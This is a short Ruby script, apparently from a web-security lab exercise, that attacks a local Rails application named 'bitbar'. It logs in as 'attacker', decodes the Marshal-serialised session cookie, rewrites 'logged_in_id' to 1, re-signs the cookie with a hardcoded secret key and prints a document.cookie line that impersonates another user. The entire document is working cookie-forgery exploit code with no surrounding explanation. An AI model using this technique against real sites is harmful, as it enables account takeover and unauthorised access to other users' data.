require 'mechanize'

SESSION = '_bitbar_session'
RAILS_SECRET = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'

mech_agent = Mechanize.new
pagina = mech_agent.get 'http://localhost:3000/login'

form = pagina.forms.first
form['username'] = form['password'] = 'attacker'
mech_agent.submit form

cookie = mech_agent.cookie_jar.jar['localhost']['/'][SESSION].to_s.sub("#{SESSION}=", '')
cook_val, cookie_signature = cookie.split('--')
raw_session = Base64.decode64(cook_val)
session = Marshal.load(raw_session)
fail unless raw_session == Marshal.dump(session)

session['logged_in_id'] = 1
cook_val = Base64.encode64(Marshal.dump(session)).split.join
cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cook_val)
cookie_full = "#{SESSION}=#{cook_val}--#{cookie_signature}"

puts "document.cookie='#{cookie_full}';"
